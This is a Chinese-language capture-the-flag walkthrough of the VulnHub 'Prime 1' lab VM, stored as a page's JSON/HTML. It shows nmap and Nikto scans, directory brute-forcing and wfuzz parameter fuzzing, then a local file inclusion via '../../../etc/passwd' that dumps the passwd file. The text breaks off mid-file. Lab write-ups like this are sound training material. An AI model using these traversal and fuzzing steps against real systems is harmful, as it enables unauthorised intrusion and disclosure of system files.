{"pageProps":{"postData":{"id":"VulnhubPrime 1","contentHtml":"<h1>Prime 1</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/prime-1,358/\">https://www.vulnhub.com/entry/prime-1,358/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>探测存活主机，137是靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span> \n<span class=\"hljs-comment\">//                       </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-22 16:25 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00028</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00026</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0010</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">69</span>:EE:<span class=\"hljs-number\">71</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00018</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F8:B3:<span class=\"hljs-number\">1</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>扫描靶机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>        \n<span class=\"hljs-comment\">//                   </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-22 17:54 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0014</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">69</span>:EE:<span class=\"hljs-number\">71</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描服务版本及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p22,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>           \n<span class=\"hljs-comment\">//                     </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-22 17:57 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00045</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">7.2</span>p2 Ubuntu <span class=\"hljs-number\">4</span>ubuntu2.<span class=\"hljs-number\">8</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">18</span> ((Ubuntu))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">69</span>:EE:<span class=\"hljs-number\">71</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n</code></pre>\n</li>\n<li>\n<p>udp扫描</p>\n<pre><code class=\"hljs language-php\">nmap -sU <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>  \n<span class=\"hljs-comment\">//                       </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-22 17:57 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00073</span>s latency).\nNot shown: <span class=\"hljs-number\">997</span> closed udp <span class=\"hljs-title function_ invoke__\">ports</span> (port-unreach)\nPORT     STATE         SERVICE\n<span class=\"hljs-number\">68</span>/udp   open|filtered dhcpc\n<span class=\"hljs-number\">631</span>/udp  open|filtered ipp\n<span class=\"hljs-number\">5353</span>/udp open|filtered zeroconf\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">69</span>:EE:<span class=\"hljs-number\">71</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-php\">nmap -script=vuln -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>, <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>       \n<span class=\"hljs-comment\">//</span>\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\n|_http-vuln-cve2017-<span class=\"hljs-number\">1001000</span>: ERROR: Script execution <span class=\"hljs-title function_ invoke__\">failed</span> (<span class=\"hljs-keyword\">use</span> -d to debug)\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-<span class=\"hljs-number\">2007</span>-<span class=\"hljs-number\">6750</span>\n|       Slowloris tries to keep many connections to the target web server open <span class=\"hljs-keyword\">and</span> hold\n|       them open <span class=\"hljs-keyword\">as</span> long <span class=\"hljs-keyword\">as</span> possible.  It accomplishes this by opening connections to\n|       the target web server <span class=\"hljs-keyword\">and</span> sending a partial request. By doing so, it starves\n|       the http server<span class=\"hljs-string\">'s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_http-csrf: Couldn'</span>t find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n| http-enum: \n|   /wordpress/: Blog\n|_  /wordpress/wp-login.php: Wordpress login page.\n|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">69</span>:EE:<span class=\"hljs-number\">71</span> (VMware)\n</code></pre>\n<p>扫描出 <code>slowloris DOS</code>用不上，以及<code>cve2017-1001000</code> ，并且扫出存在<code>wordpress</code> 版本是&#x3C;<code>4.7.2</code>的，因为能扫描出<code>cve2017-1001000</code></p>\n</li>\n<li>\n<p>Nikto漏洞扫描</p>\n<pre><code class=\"hljs language-php\">nikto -host <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span> -port <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>\n<span class=\"hljs-comment\">//</span>\n- Nikto v2.<span class=\"hljs-number\">5.0</span>\n---------------------------------------------------------------------------\n---------------------------------------------------------------------------\n+ Target IP:          <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>\n+ Target Hostname:    <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>\n+ Target Port:        <span class=\"hljs-number\">80</span>\n+ Start Time:         <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">09</span>-<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">45</span> (GMT8)\n---------------------------------------------------------------------------\n+ Server: Apache/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">18</span> (Ubuntu)\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https:<span class=\"hljs-comment\">//developer.mozill.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span>\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render th content of the site in a different fashion to the MIME type. See: https:<span class=\"hljs-comment\">//www.netsparker.com/wb-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span>\n+ No CGI Directories <span class=\"hljs-title function_ invoke__\">found</span> (<span class=\"hljs-keyword\">use</span> <span class=\"hljs-string\">'-C all'</span> to force check all possible dirs)\n+ Apache/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">18</span> appears to be <span class=\"hljs-title function_ invoke__\">outdated</span> (current is at least Apache/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">54</span>). Apache <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">34</span> is th EOL <span class=\"hljs-keyword\">for</span> the <span class=\"hljs-number\">2</span>.x branch.\n+ /: Web Server returns a valid response with junk HTTP methods which may cause <span class=\"hljs-literal\">false</span> positives\n+ /icons/README: Apache <span class=\"hljs-keyword\">default</span> file found. See: https:<span class=\"hljs-comment\">//www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/                                                                           </span>\n+ /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin <span class=\"hljs-string\">'Tested up to'</span> version usually matches the WordPress version.                                                \n+ /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.           \n+ /wordpress/wp-admin/: Uncommon header <span class=\"hljs-string\">'x-redirect-by'</span> found, with contents: WordPress.       \n+ /wordpress/: Drupal Link header found with value: &#x3C;http:<span class=\"hljs-comment\">//192.168.75.137/wordpress/index.php?rest_route=/>; rel=\"https://api.w.org/\". See: https://www.drupal.org/                          </span>\n+ /wordpress/: A Wordpress installation was found.\n+ /wordpress/wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https:<span class=\"hljs-comment\">//developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</span>\n+ /wordpress/wp-content/uploads/: <span class=\"hljs-built_in\">Directory</span> indexing found.\n+ /wordpress/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.\n+ /wordpress/wp-login.php: Wordpress login found.\n+ <span class=\"hljs-number\">8106</span> requests: <span class=\"hljs-number\">0</span> <span class=\"hljs-title function_ invoke__\">error</span>(s) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-title function_ invoke__\">item</span>(s) reported on remote host\n+ End Time:           <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">09</span>-<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">09</span> (GMT8) (<span class=\"hljs-number\">24</span> seconds)\n---------------------------------------------------------------------------\n+ <span class=\"hljs-number\">1</span> <span class=\"hljs-title function_ invoke__\">host</span>(s) tested\n\n</code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>爆破目录，<code>192.168.75.137</code></p>\n<pre><code class=\"hljs language-php\">[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">131</span>B  - /dev\n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">25</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">137</span>B  - /image.php\n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">321</span>B  - /javascript  ->  http:<span class=\"hljs-comment\">//192.168.75.137/javascript/</span>\n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">32</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">279</span>B  - /server-status/\n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">32</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">279</span>B  - /server-status\n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">36</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">1</span>KB - /wordpress/wp-login.php\n[<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">36</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">4</span>KB - /wordpress/\n</code></pre>\n<p>查看<code>/dev</code> ，因为它不是一个正常该有的目录</p>\n<pre><code class=\"hljs language-php\">hello,\n\nnow you are at level <span class=\"hljs-number\">0</span> stage.\n\nIn <span class=\"hljs-keyword\">real</span> life pentesting we should <span class=\"hljs-keyword\">use</span> <span class=\"hljs-title\">our</span> <span class=\"hljs-title\">tools</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">dig</span> <span class=\"hljs-title\">on</span> <span class=\"hljs-title\">a</span> <span class=\"hljs-title\">web</span> <span class=\"hljs-title\">very</span> <span class=\"hljs-title\">hard</span>.\n\n<span class=\"hljs-title\">Happy</span> <span class=\"hljs-title\">hacking</span>. \n</code></pre>\n<p>意思是让我们更努力的去爆破目录？</p>\n</li>\n<li>\n<p><code>python .\\dirsearch.py -u http://192.168.75.137/ --suffixes .txt,.zip</code> 给字典加上<code>.txt,.zip</code> 后缀去爆破</p>\n<pre><code class=\"hljs language-php\">http:<span class=\"hljs-comment\">//192.168.75.137/secret.txt</span>\n</code></pre>\n<p>查看内容得出</p>\n<pre><code class=\"hljs language-php\">Looks like you have got some secrets.\n\nOk I just want to <span class=\"hljs-keyword\">do</span> some help to you. \n\nDo some more fuzz on every page of php which was finded by you. And <span class=\"hljs-keyword\">if</span>\nyou get any right parameter then follow the below steps. If you still stuck \nLearn <span class=\"hljs-keyword\">from</span> here a basic tool with good usage <span class=\"hljs-keyword\">for</span> OSCP.\n\nhttps:<span class=\"hljs-comment\">//github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</span>\n\n<span class=\"hljs-comment\">//see the location.txt and you will get your next move//</span>\n</code></pre>\n<p>让我们进行<code>fuzz</code>爆破，大概意思是让我们在所有<code>php</code>文件进行<code>fuzz</code> ，大概就是让我们<code>fuzz</code>出<code>get</code>参数</p>\n</li>\n<li>\n<p>扫描出所有<code>php</code>文件</p>\n<pre><code class=\"hljs language-php\">irb http:<span class=\"hljs-comment\">//192.168.75.137 -X .php               </span>\n\n-----------------\nDIRB v2.<span class=\"hljs-number\">22</span>    \nBy The Dark Raver\n-----------------\n\nSTART_TIME: Sun Sep <span class=\"hljs-number\">22</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">05</span> <span class=\"hljs-number\">2024</span>\nURL_BASE: http:<span class=\"hljs-comment\">//192.168.75.137/</span>\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\nEXTENSIONS_LIST: (.php) | (.php) [NUM = <span class=\"hljs-number\">1</span>]\n\n-----------------\n\nGENERATED WORDS: <span class=\"hljs-number\">4612</span>                                                          \n\n---- Scanning URL: http:<span class=\"hljs-comment\">//192.168.75.137/ ----</span>\n+ http:<span class=\"hljs-comment\">//192.168.75.137/image.php (CODE:200|SIZE:147)                                                                                      </span>\n+ http:<span class=\"hljs-comment\">//192.168.75.137/index.php (CODE:200|SIZE:136)                                                                                      </span>\n                                                                                                                                           \n-----------------\nEND_TIME: Sun Sep <span class=\"hljs-number\">22</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">08</span> <span class=\"hljs-number\">2024</span>\nDOWNLOADED: <span class=\"hljs-number\">4612</span> - FOUND: <span class=\"hljs-number\">2</span>\n</code></pre>\n<p>当前目录下只有两个php文件我们两个都试试</p>\n</li>\n<li>\n<p>对<code>index.php</code>进行<code>fuzz</code></p>\n<p>注意 <code>--hh 136</code> 需要对视情况进行调整，过滤掉其他结果后，最后得出<code>file</code>这个参数</p>\n<pre><code class=\"hljs language-php\">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh <span class=\"hljs-number\">136</span> http:<span class=\"hljs-comment\">//192.168.75.137/index.php?FUZZ=something</span>\n<span class=\"hljs-comment\">//hh 过滤掉了 字长为136的数据</span>\n********************************************************\n* Wfuzz <span class=\"hljs-number\">3.1</span>.<span class=\"hljs-number\">0</span> - The Web Fuzzer                         *\n********************************************************\n\nTarget: http:<span class=\"hljs-comment\">//192.168.75.137/index.php?FUZZ=something</span>\nTotal requests: <span class=\"hljs-number\">951</span>\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                       \n=====================================================================\n\n<span class=\"hljs-number\">000000341</span>:   <span class=\"hljs-number\">200</span>        <span class=\"hljs-number\">7</span> L      <span class=\"hljs-number\">19</span> W       <span class=\"hljs-number\">206</span> Ch      <span class=\"hljs-string\">\"file\"</span>                        \n\nTotal time: <span class=\"hljs-number\">1.060608</span>\nProcessed Requests: <span class=\"hljs-number\">951</span>\nFiltered Requests: <span class=\"hljs-number\">950</span>\nRequests/sec.: <span class=\"hljs-number\">896.6547</span>\n\n</code></pre>\n</li>\n<li>\n<p>访问<code>http://192.168.75.137/index.php?file=</code></p>\n<pre><code class=\"hljs language-php\">提示：Do something better you are digging wrong file\n</code></pre>\n<p>可能file的参数也需要我们进行<code>fuzz</code>，其实这事<code>burp</code>也可以做</p>\n<p>但是之前的<code>secret.txt</code>还有一句 : //see the <code>location.txt</code> and you will get your next move//</p>\n<p>所以我们访问 ：<code>http://192.168.75.137/index.php?file=location.txt</code></p>\n<p>果然存在有信息</p>\n<pre><code class=\"hljs language-php\">Now dig some more <span class=\"hljs-keyword\">for</span> next one\n<span class=\"hljs-keyword\">use</span> '<span class=\"hljs-title\">secrettier360</span>' <span class=\"hljs-title\">parameter</span> <span class=\"hljs-title\">on</span> <span class=\"hljs-title\">some</span> <span class=\"hljs-title\">other</span> <span class=\"hljs-title\">php</span> <span class=\"hljs-title\">page</span> <span class=\"hljs-title\">for</span> <span class=\"hljs-title\">more</span> <span class=\"hljs-title\">fun</span>. \n</code></pre>\n<p>让我们使用<code>secrettier360</code> 参数去别的<code>php</code>页面<code>fuzz</code> ，大概是</p>\n<p>别的<code>php</code>页面除了<code>index.php</code>那就是<code>image.php</code></p>\n</li>\n<li>\n<p>对<code>image.php</code> 进行<code>fuzz</code></p>\n<pre><code class=\"hljs language-php\">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh <span class=\"hljs-number\">197</span> http:<span class=\"hljs-comment\">//192.168.75.137/image.php?secrettier360=FUZZ</span>\n********************************************************\n* Wfuzz <span class=\"hljs-number\">3.1</span>.<span class=\"hljs-number\">0</span> - The Web Fuzzer                         *\n********************************************************\n\nTarget: http:<span class=\"hljs-comment\">//192.168.75.137/image.php?secrettier360=FUZZ</span>\nTotal requests: <span class=\"hljs-number\">951</span>\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                       \n=====================================================================\n\n<span class=\"hljs-number\">000000257</span>:   <span class=\"hljs-number\">200</span>        <span class=\"hljs-number\">13</span> L     <span class=\"hljs-number\">43</span> W       <span class=\"hljs-number\">328</span> Ch      <span class=\"hljs-string\">\"dev\"</span>                         \n\nTotal time: <span class=\"hljs-number\">1.031432</span>\nProcessed Requests: <span class=\"hljs-number\">951</span>\nFiltered Requests: <span class=\"hljs-number\">950</span>\nRequests/sec.: <span class=\"hljs-number\">922.0189</span>\n</code></pre>\n<p>得出参数<code>dev</code> ，尝试访问：<code>http://192.168.75.137/image.php?secrettier360=dev</code></p>\n<pre><code class=\"hljs language-php\">finaly you got the right parameter\n\nhello, now you are at level <span class=\"hljs-number\">0</span> stage. In <span class=\"hljs-keyword\">real</span> life pentesting we should <span class=\"hljs-keyword\">use</span> <span class=\"hljs-title\">our</span> <span class=\"hljs-title\">tools</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">dig</span> <span class=\"hljs-title\">on</span> <span class=\"hljs-title\">a</span> <span class=\"hljs-title\">web</span> <span class=\"hljs-title\">very</span> <span class=\"hljs-title\">hard</span>. <span class=\"hljs-title\">Happy</span> <span class=\"hljs-title\">hacking</span>. \n</code></pre>\n<p>WTF？这不是之前的<code>/dev</code>吗，但是发现你只要在<code>secrettier360</code> 加上文件名，那不就是文件包含了吗?我这里大发奇想使用<code>php伪协议</code>尝试，但是发现使用不了，应该是禁用了</p>\n</li>\n<li>\n<p>利用文件包含漏洞</p>\n<p>尝试读取<code>/etc/passwd</code></p>\n<pre><code class=\"hljs language-php\">http:<span class=\"hljs-comment\">//192.168.75.137/image.php?secrettier360=../../../etc/passwd</span>\n<span class=\"hljs-comment\">//</span>\nroot:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:/root:/bin/bash daemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:/usr/sbin:/usr/sbin/nologin \nbin:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:bin:/bin:/usr/sbin/nologin sys:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">3</span>:sys:/dev:/usr/sbin/nologin \nsync:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">65534</span>:sync:/bin:/bin/sync games:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">60</span>:games:/usr/games:/usr/sbin/nologin \nman:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">12</span>:man:/<span class=\"hljs-keyword\">var</span>/cache/man:/usr/sbin/nologin \nlp:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">7</span>:lp:/<span class=\"hljs-keyword\">var</span>/spool/lpd:/usr/sbin/nologin \nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">8</span>:mail:/<span class=\"hljs-keyword\">var</span>/mail:/usr/sbin/nologin \nnews:x:<span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">9</span>:news:/<span class=\"hljs-keyword\">var</span>/spool/news:/usr/sbin/nologin \nuucp:x:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:uucp:/<span class=\"hljs-keyword\">var</span>/spool/uucp:/usr/sbin/nologin \nproxy:x:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">13</span>:proxy:/bin:/usr/sbin/nologin \nwww-data:x:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">33</span>:www-data:/<span class=\"hljs-keyword\">var</span>/www:/usr/sbin/nologin \nbackup:x:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">34</span>:backup:/<span class=\"hljs-keyword\">var</span>/backups:/usr/sbin/nologin \n<span class=\"hljs-keyword\">list</span>:x:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">38</span>:Mailing List Manager:/<span class=\"hljs-keyword\">var</span>/<span class=\"hljs-keyword\">list</span>:/usr/sbin/nologin \nirc:x:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">39</span>:ircd:/<span class=\"hljs-keyword\">var</span>/run/ircd:/usr/sbin/nologin \ngnats:x:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">41</span>:Gnats Bug-Reporting <span class=\"hljs-title function_ invoke__\">System</span> (admin):/<span class=\"hljs-keyword\">var</span>/lib/gnats:/usr/sbin/nologin \nnobody:x:<span class=\"hljs-number\">65534</span>:<span class=\"hljs-number\">65534</span>:nobody:/nonexistent:/usr/sbin/nologin \nsystemd-timesync:x:<span class=\"hljs-number\">100</span>:<span class=\"hljs-number\">102</span>:systemd Time Synchronization,,,:/run/systemd:/bin/<span class=\"hljs-literal\">false</span> \nsystemd-network:x:<span class=\"hljs-number\">101</span>:<span class=\"hljs-number\">103</span>:systemd Network Management,,,:/run/systemd/netif:/bin/<span class=\"hljs-literal\">false</span> \nsystemd-resolve:x:<span class=\"hljs-number\">102</span>:<span class=\"hljs-number\">104</span>:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class=\"hljs-literal\">false</span> \nsystemd-bus-proxy:x:<span class=\"hljs-number\">103</span>:<span class=\"hljs-number\">105</span>:systemd Bus Proxy,,,:/run/systemd:/bin/<span class=\"hljs-literal\">false</span> \nsyslog:x:<span class=\"hljs-number\">104</span>:<span class=\"hljs-number\">108</span>::/home/syslog:/bin/<span class=\"hljs-literal\">false</span> \n_apt:x:<span class=\"hljs-number\">105</span>:<span class=\"hljs-number\">65534</span>::/nonexistent:/bin/<span class=\"hljs-literal\">false</span> \nmessagebus:x:<span class=\"hljs-number\">106</span>:<span class=\"hljs-number\">110</span>::/<span class=\"hljs-keyword\">var</span>/run/dbus:/bin/<span class=\"hljs-literal\">false</span> \nuuidd:x:<span class=\"hljs-number\">107</span>:<span class=\"hljs-number\">111</span>::/run/uuidd:/bin/<span class=\"hljs-literal\">false</span> \nlightdm:x:<span class=\"hljs-number\">108</span>:<span class=\"hljs-number\">114</span>:Light Display Manager:/<span class=\"hljs-keyword\">var</span>/lib/lightdm:/bin/<span class=\"hljs-literal\">false</span> \nwhoopsie:x:<span class=\"hljs-number\">109</span>:<span class=\"hljs-number\">117</span>::/nonexistent:/bin/<span class=\"hljs-literal\">false</span> \navahi-autoipd:x:<span class=\"hljs-number\">110</span>:<span class=\"hljs-number\">119</span>:Avahi autoip daemon,,,:/<span class=\"hljs-keyword\">var</span>/lib/avahi-autoipd:/bin/<span class=\"hljs-literal\">false</span> \navahi:x:<span class=\"hljs-number\">111</span>:<span class=\"hljs-number\">120</span>:Avahi mDNS daemon,,,:/<span class=\"hljs-keyword\">var</span>/run/avahi-daemon:/bin/<span class=\"hljs-literal\">false</span> \ndnsmasq:x:<span class=\"hljs-number\">112</span>:<span class=\"hljs-number\">65534</span>:dnsmasq,,,:/<span class=\"hljs-keyword\">var</span>/lib/misc:/bin/<span class=\"hljs-literal\">false</span> \ncolord:x:<span class=\"hljs-number\">113</span>:<span class=\"hljs-number\">123</span>:colord colour management daemon,,,:/<span class=\"hljs-keyword\">var</span>/lib/colord:/bin/<span class=\"hljs-literal\">false</span> \nspeech-dispatcher:x:<span class=\"hljs-number\">114</span>:<span class=\"hljs-number\">29</span>:Speech Dispatcher,,,:/<span class=\"hljs-keyword\">var</span>/run/speech-dispatcher:/bin/<span class=\"hljs-literal\">false</span> \nhplip:x:<span class=\"hljs-number\">115</span>:<span class=\"hljs-number\">7</span>:HPLIP system user,,,:/<span class=\"hljs-keyword\">var</span>/run/hplip:/bin/<span class=\"hljs-literal\">false</span> \nkernoops:x:<span class=\"hljs-number\">116</span>:<span class=\"hljs-number\">65534</span>:Kernel Oops Tracking Daemon,,,:/:/bin/<span class=\"hljs-literal\">false</span> \npulse:x:<span class=\"hljs-number\">117</span>:<span class=\"hljs-number\">124</span>:PulseAudio daemon,,,:/<span class=\"hljs-keyword\">var</span>/run/pulse:/bin/<span class=\"hljs-literal\">false</span> \nrtkit:x:<span class=\"hljs-number\">118</span>:<span class=\"hljs-number\">126</span>:RealtimeKit,,,:/proc:/bin/<span class=\"hljs-literal\">false</span> \nsaned:x:<span class=\"hljs-number\">119</span>:<span class=\"hljs-number\">127</span>::/<span class=\"hljs-keyword\">var</span>/lib/saned:/bin/<span class=\"hljs-literal\">false</span> \nusbmux:x:<span class=\"hljs-number\">120</span>:<span class=\"hljs-number\">46</span>:usbmux daemon,,,:/<span class=\"hljs-keyword\">var</span>/lib/usbmux:/bin/<span class=\"hljs-literal\">false</span> \nvictor:x:<span 